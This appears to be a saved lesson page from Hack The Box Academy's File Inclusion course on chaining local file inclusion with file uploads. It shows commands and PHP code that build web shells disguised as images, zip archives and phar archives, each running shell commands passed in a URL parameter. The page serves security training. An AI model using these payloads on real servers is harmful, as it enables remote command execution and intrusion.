<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/1493
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 1493
// Section Title: LFI and File Uploads
// Page Title: Hack The Box - Academy
// Page Number: 7
-->

# LFI and File Uploads

**Module Name:** File Inclusion **Page Number:** 7

#### 

#### FILE INCLUSION

# LFI and File Uploads

## Image upload

#### Crafting Malicious Image

``` shell-session
ndefstathiou@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

![https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

#### Uploaded File Path

``` html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

![https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)

## Zip Upload

``` shell-session
ndefstathiou@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

![https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

## Phar Upload

``` php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

``` shell-session
ndefstathiou@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

![https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

# 

# 

#### Questions

####